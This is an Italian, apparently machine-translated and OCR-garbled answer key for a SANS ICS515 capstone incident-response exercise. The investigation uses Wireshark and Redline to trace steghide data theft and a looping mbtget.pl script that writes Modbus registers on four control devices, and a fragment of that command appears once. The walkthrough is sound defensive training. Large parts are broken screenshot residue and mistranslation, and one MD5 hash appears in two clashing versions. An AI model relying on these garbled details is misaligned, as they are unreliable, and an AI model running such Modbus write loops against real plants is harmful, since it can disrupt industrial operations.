© 2021, Robert M. Lee I.C.S.515 Mini-Capstone del quinto giorno 5 Nello stesso flusso TCP dell'ultima sessione, vediamo che il contenuto restituito dalla richiesta GET includeva un file zip e un eseguibile. Esiste una versione 1 e 2 di entrambi i file.
 7. Quale eseguibile è presente nel traffico?
 AX SW SUITE 1.81 AddOn V1.exe
 Possiamo vedere l'eseguibile anche nella posizione della domanda precedente; tuttavia, un altro modo affidabile per vedere i file passati per sessioni non crittografate è accedere a File > Esporta oggetti > HTTP.
 Esporta pacchetti specificati... Esporta dissezioni pacchetto Esporta pacchetto selezionato per byte Esporta PDU su file...
! Esporta oggetti di esportazione sessione SSL

& Stampa...
 Qpen... Ctrl+O >pt e Apri recenti » Unisci...: importa da Hex Dump... Destinazione
| 9€ Chiudi Ctrl+W FFO2: ic

® Salva Ctl+S BTFO2Z::c
 7) Salva con nome... Shift+Ctrl+$ un insieme di file
 L'eseguibile è lì ed è grande 40 MB. Sarebbe bene salvarlo affinché gli addetti alla manipolazione delle minacce e dell'ambiente possano esaminarlo in seguito. Ciò però esula dall'ambito di questo scenario.
 8. Da quale indirizzo IP ha avuto origine l'eseguibile?
 10.1.1.2
 L'indirizzo IP associato al traffico HTTP è 10.1.1.2; questo è interessante perché è un IP interno
 indirizzo e ogni sessione avviene tramite quell'indirizzo IP. Pertanto, è probabile che si tratti di un proxy utilizzato internamente
 alla rete. I proxy sono un'ottima fonte di registri e prove forensi, inclusi i timestamp di
 sessioni richieste.

*Nota* Le seguenti domande riguardano Capture 6:
 Rendendoti conto che probabilmente nella rete entrano alcuni file strani o potenzialmente dannosi, chiedi al sito
 personale per catturare un'altra zona demilitarizzata. Questo ti fornirà le informazioni più recenti da ciò che è
 succedendo in rete.
 9. Qual è il file zip nel traffico?

© 2021, Robert M. Lee
 IP EtherNet reso semplice.zip
 1CS515 Mini-Capstone del quinto giorno 6
 eyBf®oO
 aoeoene @
 uno

’
 fa, sì
 O24
 ww
 Ww Ww a ay ay ay ay ay w
 Poiché Capture 6 ha anche traffico HTTP, possiamo nuovamente andare su File > Esporta oggetti > HTTP e vedere se succede qualcosa. In questo caso, vediamo il file zip “EtherNet_IP_Made_Easy.zip” dallo stesso sito web freefirmware degli altri file zip. È probabile che un tecnico della rete stia cercando di aggiornare il firmware di un dispositivo o di ottenere aiuto e abbia semplicemente fatto delle scelte sbagliate su dove andare.

*Nota* Le seguenti domande riguardano Capture 7:
 I file osservati nella DMZ sono molto probabilmente destinati all'I.C.S interno. zone a causa della rilevanza dei file per controllare i dispositivi. Si chiede quindi al personale del sito di effettuare una cattura dell'I.C.S. zona in modo da poter avere le informazioni più recenti. Hanno riferito che si stanno verificando strane attività con l'I.C.S..
 10.
 11.
 12.
 Quale strano traffico di rete si sta verificando? Enumerazione
 Un rapido sguardo all'acquisizione mostra che ci sono molte ritrasmissioni TCP e ACK duplicati. Sembra che la comunicazione con i client Modbus TCP sia più veloce di prima e che siano potenzialmente in fase di enumerazione.
 Quali dispositivi di controllo vengono presi di mira? Tutti e quattro
 A quanto pare, tutti e quattro i dispositivi vengono scansionati. Tuttavia, non vi è alcuna indicazione di altri dispositivi, quindi la scansione sembra di natura mirata. °
 Ci sono file strani che potrebbero essere correlati a questo traffico? script.bat
 Ovviamente sta accadendo qualcosa di strano, quindi è importante cercare qualcosa che potrebbe essere la causa principale. Sappiamo che c'erano file strani trasferiti nella rete, quindi possiamo cercarli come abbiamo fatto in precedenza con Esporta oggetti > HTTP. Ciò non rivela nulla; tuttavia, questo è interno alla rete, quindi è possibile che i file vengano passati avanti e indietro tramite SMB. Pertanto, possiamo scegliere Esporta oggetti
> PMI. Questo rivela file interessanti tra cui script.bat. Questo file, nel mondo reale, verrebbe salvato e inviato agli addetti alla manipolazione delle minacce e dell'ambiente per essere analizzato.
 29735 = \\10.25.22.105\TREEID_2049 FILE (226/226) R [100,00%] 226 byte \Users\In Gary\script.bat 29747 = \\10.25.22.105\TREEID_2049 FILE (226/226) R [10,00% ] 226 byte \Users\In Gary\script.bat 29819 —\\10.25.22.105\TREEID_2049 FILE (226/226) R [100,00%] 226 byte \Users\In Gary\script.bat
> Aiuto Salva con nome Salva tutto Annulla
 Meglio ancora, però, quando si fa clic sul file "script.bat" nella finestra Esporta oggetti, possiamo anche cercare nei blocchi SMB stessi (come il pacchetto numero 29735). Lì vediamo "mbtget.p!" che è uno script Perl. Questo è importante da notare per ora poiché è probabile che si tratti dello script eseguito dal nostro "script.bat".

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 7 25.22.8. .mbtget. pl -ws 1 -a 5 10 725.22. 2 3. . Ciclo GOTO. ..-
 13. Quale utente è associato allo strano traffico? A Gary
 Dalla funzione Esporta oggetti > SMB in Wireshark, vediamo che il file script.bat sta esaurendo l'account utente "In Gary".
 14. Quale indirizzo IP è associato al file dispari? 10.25.22.105 Possiamo selezionare il file nella finestra Esporta oggetti > SMB e verrà evidenziato il pacchetto relativo a quello
 sessione nella vista principale di Wireshark. Lì vediamo che l'indirizzo IP è 10.25.22.105. Questo è un buon momento per avviare le procedure di risposta agli incidenti e acquisire l’immagine digitale dell’indirizzo IP.
 QO
 ehm, @&
 r 29734 373, 376351 10. 25. 22.103 10, 25.22.105 117 Leggi richiesta Andx, FID: 0x000a, 226 byte con offset 0
 29735 373, 37638610.25, 22.105 10,25. 22.103; 344 Lettura risposta Andx, FID: 0x000a, 226 byte
 29736 373. 377208 10. 25. 22.103 10.25.22.105 184 Richiesta Trans2, QUERY_PATH_INFO, interroga informazioni di base sul file, percorso: \users\in Gary\script. it Pret me sae]
 4h 3629 1n> tazza 400 Trane? Qocnonca Aliroy DaTY Turno

*Nota* Le seguenti domande riguardano AnalysisSession3:
 Anche se è ovvio che nell'I.C.S. è in corso un'attività dannosa, è necessario familiarizzare con l'acquisizione forense di base effettuata in precedenza dal personale del sito. Basta semplicemente saltare nella nuova cattura
 impiega ancora più tempo per familiarizzare senza farlo. È importante rimanere calmi e composti anche in uno scenario di potenziale incidente.
 15. Quali sono i due indirizzi |Pv4 per il computer ripreso? 10.25.22.105 e 169.254.18.199
 In Redline, vai alla scheda Informazioni di sistema, espandila e seleziona Schede di rete. Qui è dove puoi vedere quali indirizzi IP sono, o sono stati recentemente, associati all'immagine.
 Dati di analisi 'Intel(R) PRO/1000 MT Netwo
 Adattatore informazioni di sistema:

|| Il lease DHCP scade:

" Processi

. a Informazioni IP (maschera di sottorete): processi gerarchici
 feb0:708a:7e3:dels:12c7 ()} File system 10.25,22,105 (} Registro di sistema 169.254.168.199 (}

© 2021, Robert M. Lee I.C.S.515 Mini-Capstone del quinto giorno 8

®
 o@moqonw®®®
 aad od ed od ee a

<=
 ww modo, wy ww

@- @ @
 16.
 Qui vediamo che 10.25.22.105 viene osservato come speriamo di vedere: questo era il sistema correlato al file script.bat. Esiste però anche l’indirizzo IP 169.254.18.199. Gli intervalli 169.254.0.0/16 sono riservati per l'uso di IP privati ​​secondo RFC 3927. Questi IP vengono utilizzati quando un sistema Windows è stato configurato per DHCP, ma poi perde il contatto con il server. Questo ci mostra che probabilmente il sistema era disconnesso quando è stata scattata l'immagine. È importante prenderne nota per gli operatori che rispondono agli incidenti e dire loro di non rimuovere il client dalla rete quando scattano immagini. È possibile perdere dati preziosi
 interagire con i sistemi rimuovendoli dalla rete. Da quale posizione/cartella è stato eseguito "0001.bat"? C:\temp\
 È importante verificare che questa immagine di base sia effettivamente una buona base di riferimento. È possibile che nell'ambiente siano presenti minacce o che si stiano verificando comportamenti strani anche prima che venga presa la linea di base. Un modo semplice per farlo è guardare la scheda Processi e notare eventuali eventi interessanti. Ad esempio, esiste un processo cmd.exe che esegue il file 0001.bat. Stiamo cercando un file bat potenzialmente dannoso, quindi dovrebbe essere esaminato. È possibile che gli utenti delle operazioni utilizzino la riga di comando per una serie di motivi; tuttavia, il file viene eseguito al di fuori della posizione C:\temp\, che è comune per azioni dannose. Vorremmo contrassegnarlo per la revisione e l'analisi. Tuttavia, questo non è lo script bat che stiamo cercando.

=
 Processi ; sae ce Xe Fert 6 sichast.ere § 270A ClWindows\System32 'CAWindows\Systemd2isvchostene -kseesies a cai t Fle System {) nde err" % 2204 Windows System32 cmd /e"C\temp\Q00" bat'* Fl Syste a Registro di sistema §) sichostese % QAO CAWindows\System32 Windows System3Z\svchastene-& Locaiystemetworesticted
"Servizi Windows ms Persistenza q) sichostere % Ti CAWindows\system32 CAWindowssystem32\svchostexe -k RPCSS 17. Quale programma dannoso (file zip) è stato scaricato e utilizzato? steghide-0.5.1-win32.zip
 Rendendoci conto che c'è una strana attività nella linea di base, vogliamo scavare più a fondo. Poiché era presente una comunicazione HTTP in almeno una parte della rete, dovremmo visualizzare la scheda Cronologia URL del browser. Immediatamente, la tua attenzione dovrebbe essere attirata dai file passwords.txt, Train25.jpg e dal file steghide-0.5.1-win32.zip.

}| b Dischi Volumi Hive del registro
 Voci del percorso file://fC:/Users/Valley?20Electric/Downloads/steghide-0.5.1-win32.2ip
 C:/Utenti/Valley%20Electric/Download/steghide-0 5.1-win32/steghide/README. TXT
 file file:///Cx/Users/Valley%20Electric/Downloads/steghide-0.5 1-win32/steghide/todo.txt
 Cronologia URL del browser file:///C:/Users/Valley%20Electric/Documents/OpenPutt/OpenPuft/OpenPuff_icense.txt
 Cronologia download file ile Download nistory flev///C./Users/Valley%20Electric/Desktop/steghide-0.5.1 -win32%20(1).zip
 418. Dove potrebbe trovarsi il file nascosto?
 Treno25.jpg
 Sembra ovvio a questo punto che si sia verificata un'attività dannosa prima dell'incidente. Steghide è uno strumento comune per eseguire la steganografia o nascondere informazioni all'interno delle immagini. Il file delle password, le informazioni di accesso all'HMI e altro ancora sono stati probabilmente inseriti all'interno di Train25.jpg ed esfiltrati dalla rete. Questi file verrebbero passati agli addetti alla manipolazione delle minacce e all'ambiente, che torneranno con gli addetti al consumo di informazioni sulle minacce per ricercare se ci sono minacce attive nella comunità che utilizzano queste tattiche e cosa potrebbero fare. È anche una grande opportunità per gli analisti del monitoraggio della sicurezza della rete cercare questi file all'interno della rete e contattare gli addetti alla risposta all'incidente

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 9 it tieni gli occhi aperti per i sistemi con questo tipo di dati. Per ora, però, concentreremo la nostra attenzione sull’incidente che ha colpito direttamente i sistemi di controllo: questa è la nostra priorità. su 19. Questa attività è correlata all'attività di rete? Improbabile Ls
 Non possiamo dire con certezza se questa attività sia correlata all'attività di rete che stiamo vedendo. Ciò che stiamo vedendo in AnalysisSession3 potrebbe essere una fase di raccolta di informazioni della catena di uccisione di un avversario contro l’I.C.S.. L’attività che stiamo vedendo nella rete potrebbe essere quella seconda fase. L’attività è però improbabile
 direttamente correlato all’attività della rete.Steghide non prenderebbe di mira i sistemi di controllo come abbiamo visto, e noi
 non abbiamo trovato lo script bat specifico che stiamo cercando; per ora, sarebbe bene registrare queste informazioni Oo ma continuare a cercare i collegamenti diretti all'attività che abbiamo visto. oh
*Nota* Le seguenti domande riguardano AnalysisSession4: on
 È ovvio che l'acquisizione della linea di base non era una buona linea di base e che prima c'erano diversi problemi in corso. Sembra, tuttavia, che queste azioni osservate probabilmente non fossero correlate all’attività vista sulla rete. Potrebbero esserci più problemi sulla rete. Ma è importante trovare il problema che incide direttamente sul dispositivo di controllo.
 20. Quale file potenzialmente dannoso è stato eseguito da “In Gary”? script.bat oo
 Esaminando la scheda Processi dopo aver visualizzato la linea di base, vediamo che è presente un nuovo prompt dei comandi (alcuni in realtà) incluso uno eseguito dall'utente "In Gary" intitolato "script.bat": questo è il file che stavamo cercando. Vediamo anche nella colonna Ora di inizio che dopo l'esecuzione dello script, ci sono due processi perl.exe in esecuzione. Il file "mbiget.pl" che abbiamo visto in precedenza era uno script Perl, quindi è probabile che questo sia il file '4 in esecuzione e il vero colpevole: ora possiamo iniziare a cercarlo più da vicino.

— - - = i) Ce 98 1872 .
@periexe <a 94 2096
@ winlogonexe 2 2668 C\Windows\system32 winlogonexe 'un processi gerarchici @ corssexe 92 1388 CAWindows\system32 %SystemRoot\system32\csrss.exe Oggetto ”
, fe nem 4B svchostexe 85 2704 CAWindows\System32 CAWindows\System32\svchostexe -k secs Regt'y a Windows Services © taskhostexe 61 628 (su Persistenza come — . ”
© cmdexe rr 2964 CAWindows)System32 cmd fe “C\temp\0001 bat” * | Registri eventi degli utenti © onder Me™ 38 3768 ae cmd /e *CA\Userstin Gary/\script.bat” * is
.
(8 a se 7 21. “In Gary” era un amministratore? Sì
~
(8
 Dato che sta eseguendo nuovi programmi, è importante vedere se “In Gary” era un amministratore e se è sempre stato così. Cioè. lui o qualcun altro ha elevato i suoi privilegi? Se è così, può anche essere quando ciò è avvenuto
 interessante. Facendo clic sulla scheda Utenti, possiamo vedere che l'utente "In Gary" era un amministratore. Questo è qualcosa di cui tenere conto poiché è l'unica persona ad aver effettuato l'accesso negli ultimi mesi al di fuori dell'account Amministratore. Re o
” 22. Quando è stato creato lo script delle acquisizioni di rete sul sistema? _ 27/01/2015 alle 00:30:52 Zulu 7
© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 10 wy
" UN
 Ww ay ay ay ay ay ay ay
 av
 e noi
 23.
 Le informazioni sulla sequenza temporale sono quasi sempre interessanti per comprendere appieno tutti gli eventi e le altre attività ad essi associati. In Redline, scegli la scheda Timeline e cerca "script.bat" per vedere quando appare per la prima volta nella timeline.
 script.bat » “s in tutti i campi =~ | Cancella tutti i filtri Prec = Successivo | Superata la fine
 Riepilogo
 Percorso: C:\Utenti\in Gary MEpees MDS: 19c443fc16892ase7cd7G.. Utente: WORKSTATIONT\Valley...
 Percorso: Software\Microsoft\Windows\CurrentVersion\Expiorer\ComDig3.. Tipo: REG_XEY Valore:
 Percorso: Software\Microsoft\Windows\CurrentVersion\Explorer\ComDig3... Tipo: REG_SIN.. Valore:
 Facendo doppio clic sul record verrà rivelato che il file è stato creato il 27-0-1-2015 alle 00:30:522.
 Cercando “mbtget.p!” nella timeline, troviamo che è stato creato il “2014-08-27” che lo colloca prima dello script.bat. Sembra che questo file sia stato scaricato e successivamente richiamato in script.bat una volta identificati gli obiettivi.
 Qual è l'hash MD5 dello script? 19c443fc16892aae7c47dc068fd1i0b46
 Nella stessa vista, vediamo che l'MD5 di quel file, lo script, è 19c443fc16892aae7c47dc068fd10b46. Gli hash sono utili in ogni fase dell'ACDC. Non si dovrebbe fare eccessivo affidamento su di essi per rilevare le minacce, ma possono aiutare a individuare rapidamente un ambiente per un'infezione e aiutare a tenere traccia della minaccia affrontata.

*Nota* Le seguenti domande richiederanno una ricerca open source/ricerca su Internet:
 Con le informazioni sullo script, è ora possibile eseguire alcune analisi delle minacce e determinare cosa si sta affrontando. Ciò consentirà una migliore comprensione di ciò che è necessario fare in termini di pulizia, nonché del potenziale danno che potrebbe verificarsi o che è stato prevenuto dalla risposta all'incidente. Inoltre, qualsiasi informazione scoperta potrebbe essere condivisibile con i colleghi della comunità per garantire che, se si tratta di una minaccia esterna, la comunità possa rispondere insieme invece di dover affrontare la minaccia in modo indipendente.
 24.
 25.
 26.
 In quale repository di codice è possibile trovare lo script dannoso? Sourceperl: GitHub Script.bat è un nome generico; tuttavia, sappiamo che il vero programma dannoso è stato probabilmente lo script Perl. Pertanto, possiamo eseguire una ricerca su Google per mbtget.p! che porterà all'account GitHub "sourceperl". Afferma che mbtget è un semplice script Perl per effettuare transazioni con client Modbus TCP.Lo script può semplicemente leggere i registri o anche scrivervi? Lettura e scrittura Lo script ha la capacità di leggere e scrivere sui client; pertanto, può potenzialmente interrompere le operazioni.
 L'uso dello script (per la sua configurazione) sembrava mirato? SÌ
 Analizzare completamente la sceneggiatura aiuterà; tuttavia, dal traffico di rete sappiamo che sono stati presi di mira solo i quattro dispositivi di controllo: non sono state effettuate altre scansioni sulla rete su dispositivi che non esistevano. La configurazione predefinita per lo script dalla pagina di origine non indica che tali dispositivi siano codificati nello script. Pertanto, è probabile che il nostro aggressore conoscesse bene la struttura.

© 2021, Robert M. Lee I.C.S.515 Mini-Capstone del quinto giorno 11 27. È probabile che si tratti dell'opera di una minaccia esterna o interna? Esterno
 Al momento non possiamo dire con certezza quale tipo di gruppo di minacce stiamo affrontando. Tuttavia, la zona di controllo interno era accessibile a Internet tramite la DMZ e venivano scaricati file strani e potenzialmente dannosi. Ciò ha rivelato che si erano verificati comportamenti dannosi come il furto di dati relativi al login e alle password dell'HMI precedentemente verificatisi nell'ambiente. Successivamente vediamo che è stato utilizzato uno script comune, ma adattato al nostro ambiente, che ha interrotto l’I.C.S. rete. È improbabile che esista una minaccia interna con tutte queste informazioni; tuttavia, l’uso dello strumento di steganografia sul sistema indicherebbe che questa attività è potenzialmente una minaccia esterna. A questo punto è opportuno presumere l'uno o l'altro; tuttavia, analisi successive, interrogatori del personale e altro ancora potrebbero rivelare prove più concrete.
 28. Che tipo di informazioni potrebbero essere condivise per aiutare la comunità? Lezioni imparate
 In questo caso, non esiste un insieme di varianti di malware o qualcosa di simile da condividere veramente con la community. Tuttavia, il sito web del firmware gratuito, la visualizzazione dello script mbtget, l'esfiltrazione dei dati tramite steghide, ecc. potrebbero essere riassunti in un bel documento basato sulle lezioni apprese che dice anche alle persone quali azioni sono state intraprese per scoprire e rispondere a questi risultati. Questi tipi di documenti tratti dalle lezioni realizzate e condivise in tutta la comunità migliorano i difensori.
 Conclusioni sullo scenario uno
 Nello scenario sembra che la minaccia scoperta sia in realtà una minaccia esterna. Lo script utilizzato era pubblicamente disponibile, ma era mirato specificamente ai dispositivi di controllo della rete. Ciò richiederebbe la conoscenza della struttura probabilmente attraverso precedenti attività di spionaggio. È possibile che lo strumento steganografia sia stato utilizzato come spionaggio iniziale. Il personale addetto potrebbe trovare l'utente associato all'account "In Gary" e interrogarlo. Altri controlli come controlli di sicurezza fisica, orari dei turni, ecc. potrebbero essere utilizzati per vedere chi potrebbe essere il colpevole. Solo perché si trattava di un account "In Gary" non significa che la persona che utilizza quell'account sia necessariamente una minaccia. La cosa più importante, però, è che la minaccia è stata identificata e può essere facilmente risolta pulendo i sistemi Windows infetti (si spera che la struttura disponga di buoni backup). Ciò salvaguarderà le operazioni. Gli addetti alla manipolazione delle minacce e dell'ambiente possono fornire alcuni buoni consigli su migliori regole firewall DMZ e IDS e gli addetti al consumo di Threat Intelligence possono rendere gli altri nella comunità consapevoli del sito freefirmware e dello script MBTget. È improbabile che altri affrontino questo problema, ma è possibile.
 Il concetto di ciclo di difesa informatica attiva può essere utilizzato in diversi modi. In questo scenario si trattava di un processo svolto da una sola persona. Idealmente, un'organizzazione può impiegare più team in cui possono verificarsi specializzazione e concentrazione, ma non è sempre la realtà. È possibile lavorare tramite ACDC come singola persona. Il modello può quindi fornire indicazioni su quali cose una persona dovrebbe considerare e quali azioni intraprendere successivamente. Avere un modello che guidi le azioni, soprattutto quando si affrontano le minacce, può fare una differenza significativa nel raggiungimento del successo.

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 12

(B)